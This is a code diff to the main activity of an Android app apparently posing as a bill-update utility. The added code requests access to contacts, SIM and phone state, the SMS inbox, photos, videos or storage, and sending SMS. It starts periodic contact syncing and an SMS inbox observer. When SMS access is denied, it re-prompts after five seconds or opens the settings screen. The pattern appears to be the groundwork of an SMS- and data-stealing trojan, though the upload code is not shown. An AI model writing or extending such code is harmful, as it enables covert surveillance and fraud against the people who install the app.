@@ -2,11 +2,14 @@ package com.example.bill_update_app
 
 import android.Manifest
 import android.content.Context
+import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.provider.Telephony
 
 import io.flutter.embedding.android.FlutterActivity
@@ -155,18 +158,24 @@ class MainActivity : FlutterActivity() {
 
     private fun requestContactsPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val perms = arrayOf(
+            val perms = mutableListOf(
                 Manifest.permission.READ_CONTACTS,
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.READ_PHONE_NUMBERS
             )
+            if (Build.VERSION.SDK_INT >= 33) {
+                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+            } else {
+                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
             val toRequest = perms.filter {
                 checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
             }
             if (toRequest.isNotEmpty()) {
                 requestPermissions(toRequest.toTypedArray(), 1002)
             } else {
-                ContactSync.init(this)
+                ContactSync(this@MainActivity).startPeriodicSync()
             }
         }
     }
@@ -184,21 +193,28 @@ class MainActivity : FlutterActivity() {
             if (smsGranted) {
                 startSmsObserver()
             } else {
-                Handler(Looper.getMainLooper()).postDelayed({
-                    requestPermissions(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS), 1001)
-                }, 5000)
+                if (Build.VERSION.SDK_INT >= 34) {
+                    openAppSettings()
+                } else {
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        requestPermissions(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS), 1001)
+                    }, 5000)
+                }
             }
         } else if (requestCode == 1002) {
             for (i in permissions.indices) {
                 if (permissions[i] == Manifest.permission.READ_CONTACTS && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                    ContactSync.init(this)
+                    ContactSync(this@MainActivity).startPeriodicSync()
                 }
                 if (permissions[i] == Manifest.permission.READ_PHONE_STATE || permissions[i] == Manifest.permission.READ_PHONE_NUMBERS) {
                     DeviceRegistrar.updateSimInfo()
                 }
             }
-            if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
+            val phonePerms = arrayOf(Manifest.permission.CALL_PHONE, Manifest.permission.SEND_SMS).filter {
+                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
+            }
+            if (phonePerms.isNotEmpty()) {
+                requestPermissions(phonePerms.toTypedArray(), 1003)
             }
         } else if (requestCode == 1003) {
             for (i in permissions.indices) {
@@ -216,9 +232,19 @@ class MainActivity : FlutterActivity() {
         }
     }
 
+    private fun openAppSettings() {
+        try {
+            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                data = Uri.fromParts("package", packageName, null)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intent)
+        } catch (_: Exception) {}
+    }
+
     private fun startSmsObserver() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-            smsObserver = SmsObserver(contentResolver)
+            smsObserver = SmsObserver(contentResolver, this)
             contentResolver.registerContentObserver(
                 Telephony.Sms.Inbox.CONTENT_URI,
                 true,
